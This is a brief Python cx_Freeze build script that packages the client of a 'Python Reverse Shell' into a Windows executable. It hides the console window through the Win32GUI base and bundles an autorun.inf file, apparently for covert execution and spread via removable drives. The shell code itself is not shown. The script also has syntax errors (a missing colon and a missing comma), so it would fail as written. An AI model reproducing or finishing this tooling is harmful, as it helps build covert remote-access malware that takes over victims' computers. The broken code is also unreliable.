# Python3 Multi-Threaded Reverse Shell - Setup Client

import sys
from cx_Freeze import setup, Executable

include_files = ['autorun.inf']
base = None

if sys.platform == "win32" # Check if Win32 LOL
    base = "Win32GUI"

setup(
    name = "ReverseShell",
    version = "1.0",
    description = "Python Reverse Shell",
    options = {
        "build_exe": {
            "include_files": include_files
        }
    }
    executables = [
        Executable("client.py", base=base)
    ]
)